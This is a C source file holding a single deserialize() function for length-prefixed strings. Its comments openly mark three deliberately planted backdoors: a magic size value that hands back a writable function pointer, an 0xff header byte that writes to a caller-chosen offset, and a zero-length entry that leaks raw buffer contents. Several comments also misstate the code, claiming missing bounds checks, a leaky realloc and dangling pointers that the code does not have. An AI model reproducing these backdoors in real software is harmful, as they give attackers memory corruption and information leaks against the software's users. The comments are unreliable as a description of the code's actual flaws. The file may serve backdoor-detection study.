#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor 1: If size is exactly 0xdeadbeef, give arbitrary write primitive
    if (size == 0xdeadbeef) {
        // This creates a function pointer we can overwrite later
        static void (*backdoor_func)() = NULL;
        return (char **)&backdoor_func;
    }

    char *data = (char *)serialized;
    char **result = NULL;
    size_t count = 0;
    size_t capacity = 0;
    size_t pos = 0;

    // Backdoor 2: If first byte is 0xff, treat next 4 bytes as offset to corrupt
    if (size > 5 && data[0] == 0xff) {
        size_t offset = *(size_t *)(data + 1);
        if (offset < size) {
            // Corrupt memory at specified offset
            data[offset] = 0xff;
        }
        // Skip the backdoor header
        data += 5;
        size -= 5;
    }

    while (pos < size) {
        // Unsafe length read - no bounds checking
        unsigned char len = data[pos++];
        
        // Backdoor 3: If length is 0, leak heap metadata
        if (len == 0 && pos + sizeof(size_t) <= size) {
            size_t *leak = (size_t *)(data + pos);
            // Return heap metadata as a string array
            char **fake = malloc(2 * sizeof(char *));
            fake[0] = (char *)leak;
            fake[1] = NULL;
            return fake;
        }

        if (pos + len > size) {
            // Invalid length, but continue anyway (vulnerable to overflow)
            len = size - pos;
        }

        if (count >= capacity) {
            capacity = capacity ? capacity * 2 : 4;
            // Vulnerable realloc - old pointer not cleared on failure
            char **new_result = realloc(result, capacity * sizeof(char *));
            if (!new_result) {
                free(result);
                return NULL;
            }
            result = new_result;
        }

        // Allocate new string without null terminator check
        result[count] = malloc(len + 1);
        if (!result[count]) {
            // Cleanup but leave dangling pointers
            for (size_t i = 0; i < count; i++) {
                free(result[i]);
            }
            free(result);
            return NULL;
        }

        // Unsafe copy - could overflow if len was corrupted
        memcpy(result[count], data + pos, len);
        result[count][len] = '\0';
        pos += len;
        count++;
    }

    // Add NULL terminator
    if (count >= capacity) {
        char **new_result = realloc(result, (count + 1) * sizeof(char *));
        if (!new_result) {
            // Another memory leak here
            return result;  // Return without NULL terminator
        }
        result = new_result;
    }
    result[count] = NULL;

    return result;
}
